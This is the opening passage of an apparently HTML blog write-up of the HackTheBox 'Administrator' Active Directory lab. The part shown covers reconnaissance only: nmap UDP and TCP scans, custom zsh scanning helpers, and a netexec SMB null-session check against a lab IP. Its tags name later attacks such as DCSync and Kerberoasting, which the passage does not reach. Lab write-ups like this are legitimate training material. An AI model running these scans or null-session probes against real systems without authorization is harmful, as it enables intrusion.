<!DOCTYPE html> <html lang="es"><head>
<title>Machine Administrator</title>
<base href=".">
<script src="https://kmn9.github.io/theopendoor/site-lib/scripts/copy-commands.js"></script>
<meta name="pathname" content="machine-administrator.html">
<meta name="description" content="Blog - Machine Administrator">
<meta property="og:title" content="Machine Administrator">
<meta property="og:description" content="Blog - Machine Administrator">
<meta property="og:type" content="website">
<meta property="og:url" content="machine-administrator.html">
<meta property="og:image" content="img/pasted-image-20251114000322.png">
<meta charset="UTF-8"><meta property="og:site_name" content="Blog"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="site-lib/rss.xml"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="stylesheet" href="site-lib/styles/theme.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><a href="https://kmn9.github.io/theopendoor/index.html" style="position:fixed;top:10px;left:10px;z-index:9999;background:rgba(30,30,30,0.8);backdrop-filter:blur(6px);color:#fff;padding:8px 14px;border-radius:50px;text-decoration:none;font-family:'Inter',sans-serif;font-size:14px;line-height:1;box-shadow:0 4px 12px rgba(0,0,0,0.25);transition:all 0.3s ease;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:6px;" onmouseover="this.style.background='rgba(60,60,60,0.85)';" onmouseout="this.style.background='rgba(30,30,30,0.8)';" onclick="this.blur();" >←<span style='display:none;@media(min-width:600px){display:inline;}'> Back to main page</span></a><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="Machine_Administrator_0">Machine Administrator</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-hr"><hr></div><div class="el-p"><p dir="auto">Tags: <a href="?query=tag:machine" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#machine">#machine</a> <a href="?query=tag:htb" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#htb">#htb</a> <a href="?query=tag:medium" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#medium">#medium</a> <a href="?query=tag:windows" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#windows">#windows</a> <a href="?query=tag:activedirectory" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#activedirectory">#activedirectory</a> <a href="?query=tag:genericall_abuse" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#genericall_abuse">#genericall_abuse</a> <a href="?query=tag:genericwrite_abuse" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#genericwrite_abuse">#genericwrite_abuse</a> <a href="?query=tag:forcechangepassword_abuse" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#forcechangepassword_abuse">#forcechangepassword_abuse</a> <a href="?query=tag:getchangesall_abuse" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#getchangesall_abuse">#getchangesall_abuse</a> <a href="?query=tag:getchanges_abuse" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#getchanges_abuse">#getchanges_abuse</a> <a href="?query=tag:dcsync_attack" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#dcsync_attack">#dcsync_attack</a> <a href="?query=tag:passthehash_attack" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#passthehash_attack">#passthehash_attack</a> <a href="?query=tag:kerberoasting_attack" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#kerberoasting_attack">#kerberoasting_attack</a> <a href="?query=tag:asreproasting_attack" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#asreproasting_attack">#asreproasting_attack</a> <a href="?query=tag:psafe3_password_cracking" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#psafe3_password_cracking">#psafe3_password_cracking</a> <a href="?query=tag:smb_password_spraying" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#smb_password_spraying">#smb_password_spraying</a></p></div><div class="el-hr"><hr></div><div class="el-h1"><h1 data-heading="Information Gathering" dir="auto" class="heading" id="Information_Gathering_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Information Gathering</h1></div><div class="el-h2"><h2 data-heading="Discovering OS via TTL Using `ping`" dir="auto" class="heading" id="Discovering_OS_via_TTL_Using_`ping`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering OS via TTL Using <code>ping</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">10.10</span>.11.42
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114000322.png" src="img/pasted-image-20251114000322.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114000322.png" src="img/pasted-image-20251114000322.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Based on the <code>TTL</code> values obtained from the <code>ping</code> command, the operating system of the victim machine was identified as <code>Windows</code>. Typically, a TTL value below <code>64</code> corresponds to <code>Linux</code> systems, whereas a <code>TTL</code> between <code>65</code> and <code>128</code> indicates a <code>Windows</code> system. Next, a <code>UDP</code> port scan will be performed.</p></div><div class="el-h2"><h2 data-heading="UDP Port Scan Using `nmap`" dir="auto" class="heading" id="UDP_Port_Scan_Using_`nmap`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>UDP Port Scan Using <code>nmap</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">nmap <span class="token parameter variable">-sU</span> --min-rate <span class="token number">5000</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> --top-ports <span class="token number">100</span> <span class="token number">10.10</span>.11.42 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'no-response'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114000351.png" src="img/pasted-image-20251114000351.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114000351.png" src="img/pasted-image-20251114000351.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>UDP</code> scan reported three open ports: <code>53 (DNS)</code>, <code>88 (Kerberos)</code> and <code>123 (NTP)</code>. These ports are commonly associated with an <code>Active Directory</code> environment, so next, to obtain more information about the open ports, another scan to discover <code>TCP</code> ports will be performed.</p></div><div class="el-h2"><h2 data-heading="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)" dir="auto" class="heading" id="TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114000452.png" src="img/pasted-image-20251114000452.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114000452.png" src="img/pasted-image-20251114000452.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">jmap</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[+] Introduce una IP<span class="token entity" title="\n">\n</span>"</span>
        <span class="token builtin class-name">read</span> <span class="token function">ip</span>
        <span class="token builtin class-name">echo</span>
        <span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> -p- --min-rate <span class="token number">5000</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> <span class="token variable">$ip</span> <span class="token parameter variable">-oG</span> scan
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Using a custom function named <code>jmap</code>, previously defined in the <code>.zshrc</code>, the <code>TCP</code> scan was conducted, revealing many ports also associated with an <code>Active Directory</code> environment and providing valuable context about the target machine. Following this discovery, a more detailed scan will be performed against the identified ports:</p></div><div class="el-h2"><h2 data-heading="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)" dir="auto" class="heading" id="Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">extractPorts scan
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114000739.png" src="img/pasted-image-20251114000739.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114000739.png" src="img/pasted-image-20251114000739.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">extractPorts</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Extracting information..."</span>
        
        <span class="token assign-left variable">ip_address</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'Host: \K\S+'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span> 

        <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'\d+(?=/open)'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\n'</span> <span class="token string">','</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/,$/\n/'</span><span class="token variable">)</span></span> 
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">{</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">}</span> <span class="token operator">&gt;&gt;</span> extractPorts.tmp
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token operator">|</span> xclip <span class="token parameter variable">-sel</span> clip
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Ports copied to clipboard<span class="token entity" title="\n">\n</span>"</span>
        <span class="token function">cat</span> extractPorts.tmp
        <span class="token function">rm</span> extractPorts.tmp
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function shown in the image <code>extractPorts</code>, also previously defined in the <code>.zshrc</code>, displays the information from the previous scan and copies the ports to the clipboard. This makes it easier to perform a second scan on the discovered ports, especially when there are many.</p></div><div class="el-h2"><h2 data-heading="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)" dir="auto" class="heading" id="Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap2
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114000731.png" src="img/pasted-image-20251114000731.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114000731.png" src="img/pasted-image-20251114000731.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">jmap2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">2</span> <span class="token punctuation">]</span>
        <span class="token keyword">then</span>
                <span class="token builtin class-name">echo</span> <span class="token string">"Uso: jmap2 &lt;ip&gt; &lt;ports&gt;"</span>
                <span class="token builtin class-name">return</span> <span class="token number">1</span>
        <span class="token keyword">fi</span>
        
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span> 
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span> 
        nmap -p<span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token parameter variable">-sCV</span> <span class="token string">"<span class="token variable">$ip</span>"</span>

<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function <code>jmap2</code>, also predefined in the <code>.zshrc</code>, was used to perform a targeted scan on the previously identified ports. This scan aimed to enumerate the running services and their versions, as well as to apply basic reconnaissance scripts against those services. Highlighting some information from the results, the domain name was found in the <code>LDAP</code> information, which is <code>administrator.htb</code>, and the <code>FTP</code> service did not report anything about <code>anonymous</code> login being allowed, so it may need credentials to log in. The next step will be to enumerate some basic information about the target machine via the <code>SMB</code> service, such as the <code>OS</code>, <code>architecture</code>, etc.</p></div><div class="el-h2"><h2 data-heading="TCP Port 445: SMB Enumeration Using `netexec`" dir="auto" class="heading" id="TCP_Port_445_SMB_Enumeration_Using_`netexec`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 445: SMB Enumeration Using <code>netexec</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">netexec smb <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> <span class="token string">''</span> <span class="token parameter variable">-p</span> <span class="token string">''</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114000921.png" src="img/pasted-image-20251114000921.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114000921.png" src="img/pasted-image-20251114000921.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the SMB service was enumerated using a <code>NULL</code> session, the <code>OS</code> was revealed: <code>Windows Server 2022 x64</code>, and no more interesting information was found. At this point, the domain name will be added to <code>/etc/hosts</code> to make the attacker machine associate the IP address with the domain name:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114000957.png" src="img/pasted-image-20251114000957.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114000957.png" src="img/pasted-image-20251114000957.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the domain name has been added, a <code>DNS</code> enumeration will be performed next to check if there are any name servers or other valuable 